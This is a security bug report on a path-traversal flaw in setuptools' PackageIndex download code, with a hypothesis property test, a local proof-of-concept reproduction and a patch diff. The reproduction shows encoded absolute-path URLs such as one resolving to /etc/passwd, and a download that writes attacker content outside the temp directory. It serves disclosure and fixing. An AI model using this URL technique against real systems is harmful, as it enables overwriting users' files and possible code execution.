# Bug Report: setuptools.package_index Path traversal in download filename (arbitrary file write)

**Target**: `setuptools.package_index.PackageIndex._resolve_download_filename` / `PackageIndex.download`
**Severity**: High
**Bug Type**: Logic (security)
**Date**: 2026-10-28

## Summary

`_resolve_download_filename` URL-decodes the last path segment and passes it to `os.path.join(tmpdir, name)`. If the segment holds an encoded absolute path (`%2F...`), `os.path.join` throws away `tmpdir`. As a result, `PackageIndex.download()` writes the fetched content to any path the URL chooses. The existing `..` stripping does not catch this. This is CVE-2025-47273.

## Property-Based Test

```python
import os, urllib.parse
from hypothesis import given, settings, strategies as st
from setuptools.package_index import PackageIndex

seg = st.text(st.characters(min_codepoint=0x21, max_codepoint=0x7e), min_size=1, max_size=20)

@settings(max_examples=2000)
@given(st.lists(seg, min_size=1, max_size=4))
def test_download_filename_stays_in_tmpdir(parts):
    tmpdir = "/tmp/pkgidx_root"
    path = "/".join(urllib.parse.quote(p, safe="") for p in parts)
    url = f"https://files.example.org/packages/{path}"
    result = PackageIndex._resolve_download_filename(url, tmpdir)
    assert os.path.dirname(os.path.abspath(result)) == tmpdir, (url, result)
```

**Failing input**: `parts=['/']`, which gives the URL `https://files.example.org/packages/%2F` and resolves to `/`

## Reproducing the Bug

```python
import os, tempfile, threading, http.server
from setuptools.package_index import PackageIndex

tmpdir = tempfile.mkdtemp()
print(PackageIndex._resolve_download_filename("https://example.org/pkg/%2Fetc%2Fpasswd", tmpdir))
# -> /etc/passwd

target = os.path.join(tempfile.mkdtemp(), "pwned.txt")

class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.end_headers(); self.wfile.write(b"payload")
    def log_message(self, *a): pass

srv = http.server.HTTPServer(("127.0.0.1", 0), H)
threading.Thread(target=srv.serve_forever, daemon=True).start()
url = f"http://127.0.0.1:{srv.server_port}/pkg/" + target.replace("/", "%2F")
PackageIndex().download(url, tmpdir)
print(open(target).read())  # payload -- written outside tmpdir
```

## Why This Is A Bug

`download(spec, tmpdir)` is meant to save the file inside `tmpdir`. The doctest checks this with `Path(du(url, root)).relative_to(root)`, and the `..` stripping shows the code is already trying to block traversal. Package URLs come from untrusted index pages and `find_links`. A malicious URL can therefore overwrite any file the user can write, such as `~/.bashrc` or files in site-packages, which can lead to code execution.

## Fix

```diff
         name, _fragment = egg_info_for_url(url)
         if name:
             while '..' in name:
                 name = name.replace('..', '.').replace('\\', '_')
         else:
             name = "__downloaded__"  # default if URL has no path contents
 
         if name.endswith('.egg.zip'):
             name = name[:-4]  # strip the extra .zip before download
 
-        return os.path.join(tmpdir, name)
+        filename = os.path.join(tmpdir, name)
+
+        # ensure path resolves within the tmpdir
+        if not filename.startswith(str(tmpdir)):
+            raise ValueError(f"Invalid filename {filename}")
+
+        return filename
```
